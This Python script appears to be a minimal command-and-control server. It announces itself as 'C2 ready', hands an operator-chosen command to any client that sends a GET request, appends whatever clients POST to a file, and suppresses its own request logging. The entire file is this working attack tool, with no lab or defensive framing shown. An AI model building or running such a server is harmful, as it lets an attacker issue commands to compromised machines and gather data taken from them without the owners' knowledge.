import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

port = int(sys.argv[1])
outfile = sys.argv[2]
cmd = sys.argv[3]
out_f = open(outfile, "a")

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(cmd.encode())

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(n).decode("utf-8", "replace")
        out_f.write(data + "\n")
        out_f.flush()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass

print("C2 ready on %d" % port, flush=True)
HTTPServer(("0.0.0.0", port), H).serve_forever()
